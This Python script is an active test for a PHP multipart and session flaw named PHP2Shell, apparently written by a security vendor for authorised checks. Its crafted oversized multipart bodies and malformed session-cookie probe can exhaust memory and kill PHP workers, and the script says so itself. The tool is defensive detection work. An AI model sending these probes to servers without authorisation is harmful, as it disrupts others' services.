#!/usr/bin/env python3
"""Active single-URL PHP2Shell regression test. Can terminate PHP workers.

Public multipart request shape: Assetnote / ProjectDiscovery, MIT; see notices.
No shell/code-execution payload, target discovery, redirects or retries.
"""
from __future__ import annotations

import argparse
import hashlib
import http.client
import json
import math
import re
import secrets
import ssl
import sys
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote, urlsplit

RESPONSE_LIMIT = 256 * 1024
PROBES = ((1, 4000), (8, 1020), (20, 1020))
REJECTED = {400, 401, 403, 404, 405, 407, 411, 413, 414, 415, 417, 422, 429, 431}
SESSION_MARKERS = (b'session id is too long or contains illegal characters',
                   b'failed to read session data', b'failed to write session data (')
OOM_PATTERN = re.compile(rb'Allowed memory size of [^\r\n<]*bytes exhausted[^\r\n]*(?:Unknown)', re.I)
IMPACT = ('ACTIVE TEST: sends multipart POSTs, including a one-byte file and a '
          '1 MiB parser/OOM probe. It can terminate PHP workers, disrupt requests, '
          'or trigger application upload side effects. Use only on an explicitly '
          'authorized PHP route. --extended adds 8 MiB and 20 MiB probes.')


@dataclass
class Exchange:
    label: str
    method: str
    status: int | None = None
    body_bytes: int = 0
    body_sha256: str = ''
    response_truncated: bool = False
    attempted_body_bytes: int = 0
    elapsed_seconds: float = 0
    error_type: str | None = None
    php_version_reported: str | None = None
    session_warning: bool = False
    startup_oom: bool = False
    multipart_limit_warning: bool = False


def normalize_url(raw):
    if any(ord(char) < 32 or ord(char) == 127 for char in raw):
        raise ValueError('URL contains control characters')
    target = urlsplit(raw if '://' in raw else 'https://' + raw)
    if target.scheme not in ('http', 'https') or not target.hostname:
        raise ValueError('use one http:// or https:// PHP route')
    if target.username is not None or target.password is not None or target.fragment:
        raise ValueError('URL credentials and fragments are unsupported')
    if target.port is not None and not 1 <= target.port <= 65535:
        raise ValueError('invalid port')
    return target


def load_headers(path):
    if path is None:
        return {}
    with path.open('rb') as stream:
        content = stream.read(16385)
    if len(content) > 16384:
        raise ValueError('headers file exceeds 16 KiB')
    value = json.loads(content)
    if not isinstance(value, dict):
        raise ValueError('headers file must be a JSON object')
    forbidden = {'host', 'content-length', 'transfer-encoding', 'connection',
                 'content-type', 'accept-encoding', 'user-agent', 'expect'}
    seen = set()
    for key, item in value.items():
        if (not isinstance(item, str) or not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", key)
                or key.lower() in forbidden or key.lower() in seen
                or any(ord(char) < 32 or ord(char) == 127 for char in item)):
            raise ValueError('invalid, duplicate or reserved request header')
        seen.add(key.lower())
    return value


def control_body():
    boundary = 'calcyber-control'
    return (b'--calcyber-control\r\nContent-Disposition: form-data; name="control"\r\n\r\n1\r\n'
            b'--calcyber-control--\r\n', boundary)


def session_body():
    stamp = secrets.token_hex(12)
    boundary = 'calcyber-session-' + stamp
    data = (f'--{boundary}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{stamp}\r\n'
            f'--{boundary}\r\nContent-Disposition: form-data; name="calcyber_fixture"; filename="{stamp}.txt"\r\n'
            f'Content-Type: text/plain\r\n\r\n1\r\n--{boundary}--\r\n').encode()
    return data, boundary


def multipart_probe(size_mib, parts):
    # Public, fixed regression request; no arbitrary size or nesting CLI options.
    if (size_mib, parts) not in PROBES:
        raise ValueError('unsupported probe profile')
    part = b'--\nContent-Disposition:name=a[]' + b'[a]' * 62 + b';filename=\n\n'
    base = part * parts
    filler = b'x:\n' * ((size_mib * 1048576 - len(base)) // 3)
    return (b'--\n' + filler + base[3:])[:-1]


def send(target, label, method, body, boundary, headers, timeout):
    result = Exchange(label, method, attempted_body_bytes=len(body))
    outgoing = {'Accept': '*/*', 'Accept-Encoding': 'identity', 'Connection': 'close',
                'User-Agent': 'CalCyber-authorized-PHP2Shell-active-test/1.0', **headers}
    if method == 'POST':
        outgoing['Content-Type'] = 'multipart/form-data; boundary=' + boundary
    path = quote(target.path or '/', safe="/%:@!$&'()*+,;=-._~")
    if target.query:
        path += '?' + quote(target.query, safe="/?%:@!$&'()*+,;=-._~")
    started = time.monotonic()
    connection = (http.client.HTTPSConnection(target.hostname, target.port,
                  timeout=timeout, context=ssl.create_default_context())
                  if target.scheme == 'https' else
                  http.client.HTTPConnection(target.hostname, target.port, timeout=timeout))
    try:
        connection.request(method, path, body=body if method == 'POST' else None, headers=outgoing)
        response = connection.getresponse()
        result.status = response.status
        version = re.search(r'\bPHP/(\d+\.\d+\.\d+[-+.~_A-Za-z0-9]*)',
                            response.getheader('X-Powered-By', '') + ' ' + response.getheader('Server', ''), re.I)
        if version:
            result.php_version_reported = version.group(1)[:96]
        # Cap both retained response size and time spent reading a trickling body.
        data = bytearray()
        while len(data) <= RESPONSE_LIMIT and time.monotonic() - started < timeout:
            remaining = max(0.1, timeout - (time.monotonic() - started))
            if connection.sock is not None:
                connection.sock.settimeout(remaining)
            block = response.read1(min(16384, RESPONSE_LIMIT + 1 - len(data)))
            if not block:
                break
            data.extend(block)
        else:
            if len(data) <= RESPONSE_LIMIT:
                result.error_type = 'ResponseDeadlineExceeded'
        result.response_truncated = len(data) > RESPONSE_LIMIT
        captured = bytes(data[:RESPONSE_LIMIT])
        result.body_bytes = len(captured)
        result.body_sha256 = hashlib.sha256(captured).hexdigest()
        folded = captured.lower()
        result.session_warning = all(marker in folded for marker in SESSION_MARKERS)
        result.startup_oom = bool(OOM_PATTERN.search(captured))
        result.multipart_limit_warning = b'multipart body parts limit exceeded' in folded
    except (OSError, http.client.HTTPException, ValueError) as exc:
        # Exception strings can contain URL credentials or cookies. Retain type only.
        result.error_type = type(exc).__name__
    finally:
        connection.close()
        result.elapsed_seconds = round(time.monotonic() - started, 3)
    return result


def healthy(exchange):
    return (exchange.error_type is None and exchange.status is not None
            and 200 <= exchange.status < 300 and exchange.body_bytes > 0
            and not exchange.response_truncated and not exchange.session_warning
            and not exchange.startup_oom)


def refusal(exchange):
    return (exchange.status in REJECTED or exchange.status is None
            or exchange.status is not None and 300 <= exchange.status < 400)


def classify(probe, control, post):
    if probe.status == 429:
        return 'RATE_LIMITED', 'Testing stopped immediately after HTTP 429.'
    if refusal(probe):
        return 'INCONCLUSIVE', 'Probe was rejected, redirected or did not receive an HTTP response.'
    # Positive signatures require a clean baseline; banners never decide this.
    if probe.session_warning and not control.session_warning:
        return 'LEGACY_SESSION_BEHAVIOR_OBSERVED', 'All three session warning categories appeared only on the probe; worker-reuse corruption and RCE remain unproven.'
    if probe.startup_oom and not control.startup_oom:
        return 'VULNERABLE_OOM_PATH_OBSERVED', 'Multipart startup produced the legacy in-band OOM/Unknown signature.'
    if probe.error_type or probe.status in (500, 502, 503, 504) or probe.body_bytes == 0:
        return 'WORKER_FAILURE_SUSPECTED', 'Probe failed or returned an empty/error response; this does not prove code execution.'
    if post is None or not healthy(post):
        return 'HEALTH_CHECK_FAILED', 'The PHP route did not return a healthy response after the probe.'
    if probe.response_truncated:
        return 'INCONCLUSIVE', 'Probe response exceeded the evidence limit.'
    if probe.multipart_limit_warning:
        return 'MITIGATION_BEHAVIOR_OBSERVED', 'The multipart part-limit mitigation actively rejected excess parsing work; full fix remains unverified.'
    return 'NO_VULNERABLE_BEHAVIOR_OBSERVED', 'No tested signature appeared. Suppressed errors, intermediaries and untested lifecycle paths prevent a patched verdict.'


def scan(target, *, headers=None, timeout=10, extended=False, session_only=False, transport=send):
    headers = headers or {}
    exchanges = []
    observations = []

    def request(label, method, body=b'', boundary='', selected_headers=None):
        exchange = transport(target, label, method, body, boundary,
                             headers if selected_headers is None else selected_headers, timeout)
        exchanges.append(exchange)
        return exchange

    first = request('pre-health', 'GET')
    if not healthy(first):
        verdict, reason = ('RATE_LIMITED', 'HTTP 429; no further requests sent.') if first.status == 429 else (
            'INCONCLUSIVE', 'Control must be a healthy, nonempty PHP route without pre-existing error signatures; no probe sent.')
    else:
        body, boundary = control_body()
        control = request('multipart-control', 'POST', body, boundary)
        if not healthy(control):
            verdict, reason = ('RATE_LIMITED', 'HTTP 429; no further requests sent.') if control.status == 429 else (
                'INCONCLUSIVE', 'Normal multipart control was rejected or unhealthy; no regression probe sent.')
        else:
            # Keep authentication cookies except the session cookie being tested.
            session_headers = dict(headers)
            cookie_key = next((key for key in session_headers if key.lower() == 'cookie'), 'Cookie')
            cookies = [item.strip() for item in session_headers.get(cookie_key, '').split(';')
                       if item.strip() and item.strip().split('=', 1)[0] != 'PHPSESSID']
            session_headers[cookie_key] = '; '.join(cookies + ['PHPSESSID=_'])
            body, boundary = session_body()
            probe = request('session-lifecycle', 'POST', body, boundary, session_headers)
            post = None if refusal(probe) else request('post-session-health', 'GET')
            verdict, reason = classify(probe, control, post)
            observations.append({'probe': probe.label, 'verdict': verdict, 'reason': reason})
            if verdict == 'NO_VULNERABLE_BEHAVIOR_OBSERVED' and not session_only:
                for size, parts in (PROBES if extended else PROBES[:1]):
                    probe = request(f'multipart-{size}MiB-{parts}parts', 'POST', multipart_probe(size, parts), '')
                    post = None if refusal(probe) else request(f'post-{size}MiB-health', 'GET')
                    verdict, reason = classify(probe, control, post)
                    observations.append({'probe': probe.label, 'verdict': verdict, 'reason': reason})
                    if verdict != 'NO_VULNERABLE_BEHAVIOR_OBSERVED':
                        break
    origin = f'{target.scheme}://{target.netloc}'
    return {'schema': 'calcyber-php-active-check/v1',
            'generated_utc': datetime.now(timezone.utc).isoformat(), 'target_origin': origin,
            'verdict': verdict, 'reason': reason, 'rce_proven': False, 'patch_verified': False,
            'profile': 'session-only' if session_only else 'extended' if extended else 'bounded',
            'requests': len(exchanges), 'observations': observations,
            'exchanges': [asdict(item) for item in exchanges],
            'limits': ['Single URL, serial requests, no redirect following or retries.',
                       'Worker reuse and all backends cannot be guaranteed over HTTP.',
                       'Header versions, CalCyber suffixes and clean responses never establish a fix.',
                       'Positive warning/crash signatures are not a demonstration of code execution.']}


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__, epilog=IMPACT)
    parser.add_argument('url', help='one authorized PHP execution route')
    parser.add_argument('--acknowledge-impact', action='store_true', help='confirm authorization and accept worker/upload/application impact')
    parser.add_argument('--extended', action='store_true', help='add fixed 8 MiB and 20 MiB probes if earlier probes stay inconclusive')
    parser.add_argument('--session-only', action='store_true', help='omit the parser/OOM probes; does not test the OOM path')
    parser.add_argument('--headers-file', type=Path, help='private JSON object containing required authentication headers; never logged')
    parser.add_argument('--timeout', type=float, default=10, help='per-operation/body budget in seconds, 1 to 30')
    parser.add_argument('--output', type=Path, help='JSON evidence file; excludes bodies, credentials, URL paths and query strings')
    args = parser.parse_args(argv)
    if not args.acknowledge_impact:
        parser.error(IMPACT + ' Add --acknowledge-impact to proceed. No requests sent.')
    if not math.isfinite(args.timeout) or not 1 <= args.timeout <= 30:
        parser.error('--timeout must be a finite number from 1 to 30')
    if args.session_only and args.extended:
        parser.error('--session-only and --extended are mutually exclusive')
    try:
        target = normalize_url(args.url)
        headers = load_headers(args.headers_file)
    except (ValueError, OSError):
        parser.error('Invalid URL or private headers file. No requests sent.')
    if args.output and args.output.exists():
        parser.error('Output exists; choose a new evidence filename')
    if args.output and not args.output.parent.is_dir():
        parser.error('Output parent directory does not exist')
    print(IMPACT, file=sys.stderr, flush=True)
    result = scan(target, headers=headers, timeout=args.timeout, extended=args.extended, session_only=args.session_only)
    serialized = json.dumps(result, indent=2) + '\n'
    if args.output:
        args.output.write_text(serialized, encoding='utf-8')
    print(serialized, end='')
    # No exit code means "the site is secure"; exact meanings are documented.
    if result['verdict'] in {'LEGACY_SESSION_BEHAVIOR_OBSERVED', 'VULNERABLE_OOM_PATH_OBSERVED'}:
        return 10
    if result['verdict'] in {'WORKER_FAILURE_SUSPECTED', 'HEALTH_CHECK_FAILED'}:
        return 11
    return 20


if __name__ == '__main__':
    raise SystemExit(main())
